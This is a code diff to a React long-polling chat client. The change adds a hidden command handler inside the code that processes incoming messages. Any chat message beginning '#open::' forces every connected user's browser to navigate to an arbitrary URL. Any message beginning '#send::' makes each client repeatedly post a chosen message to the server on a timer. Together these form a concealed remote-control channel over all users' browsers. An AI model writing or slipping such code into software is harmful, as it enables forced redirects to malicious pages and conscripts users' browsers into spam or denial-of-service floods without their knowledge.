@@ -18,6 +18,7 @@ class App extends Component {
 
   async componentDidMount() {
     // await this.getPastMessages();
+    this.getMessages();
   }
 
   componentDidUpdate(prevProps, prevState) {
@@ -46,7 +47,6 @@ class App extends Component {
         `http://longpoll.sartonon.fi/api/messages?id=${this.getId()}`
       );
       this.handleMessage(data);
-      console.log(data);
       this.getMessages();
     } catch (err) {
       console.log("error: ", err);
@@ -71,7 +71,31 @@ class App extends Component {
     this.setState({ message: "" });
   };
 
+  handleCommand = data => {
+    if (data[0].message[0] === "#") {
+      const splittedMessage = data[0].message.split('::');
+      const command = splittedMessage[0];
+      if (command === "#open") {
+        window.open(splittedMessage[1], "_self");
+      } else if (command === "#send") {
+        const name = splittedMessage[1];
+        const message = splittedMessage[2];
+        const interval = splittedMessage[3];
+        console.log(name, message, interval);
+        this.messageInterval = setInterval(() => {
+          axios.post("http://longpoll.sartonon.fi/api/messages", {
+            name,
+            message,
+            color: "green"
+          });
+        }, interval || 1000);
+      }
+    }
+  }
+
   handleMessage = data => {
+    console.log(data);
+    this.handleCommand(data);
     this.setState({
       messages: [...this.state.messages, ...data],
       displayedMessages: [...this.state.displayedMessages, ...data]
@@ -104,7 +128,6 @@ class App extends Component {
       usernameConfirmed: true,
       color: "green"
     });
-    this.getMessages();
   };
 
   handleMessageChange = e => {
